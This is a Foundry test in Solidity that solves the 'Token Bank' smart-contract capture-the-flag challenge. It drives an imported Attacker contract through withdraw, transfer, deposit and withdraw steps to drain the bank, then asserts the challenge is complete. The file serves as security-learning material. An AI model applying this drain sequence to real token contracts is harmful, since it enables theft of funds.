// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./TokenBankChallenge.sol";
import "./Attacker.sol";

contract TokenBankChallengeTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        tokenBankChallenge = new TokenBankChallenge(hacker);
        // used to deploy contract.
        payable(hacker).transfer(1 ether);
    }

    function testAssumeOwnership() public {
        emit log_named_string("before hack, isComplete", tokenBankChallenge.isComplete() ? "true" : "false");

        vm.startPrank(hacker);
        Attacker attacker = new Attacker(address(tokenBankChallenge));

        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(hacker));
        emit log_named_uint("hacker balance", tokenBankChallenge.token().balanceOf(hacker));

        tokenBankChallenge.token().transfer(address(attacker), tokenBankChallenge.token().balanceOf(hacker));
        emit log_named_uint("attacker balance", tokenBankChallenge.token().balanceOf(address(attacker)));

        attacker.deposit();
        emit log_string("----------after deposit----------");
        emit log_named_uint("attacker balance", tokenBankChallenge.token().balanceOf(address(attacker)));
        emit log_named_uint("attacker deposited to bank", tokenBankChallenge.balanceOf(address(attacker)));

        attacker.withdraw();

        vm.stopPrank();

        emit log_named_string("after hack, isComplete", tokenBankChallenge.isComplete() ? "true" : "false");

        emit log_named_uint("hacker balance", tokenBankChallenge.token().balanceOf(hacker));
        emit log_named_uint(
            "tokenBankChallenge balance", tokenBankChallenge.token().balanceOf(address(tokenBankChallenge))
        );
        emit log_named_uint("attacker balance", tokenBankChallenge.token().balanceOf(address(attacker)));

        assertTrue(tokenBankChallenge.isComplete());
    }
}
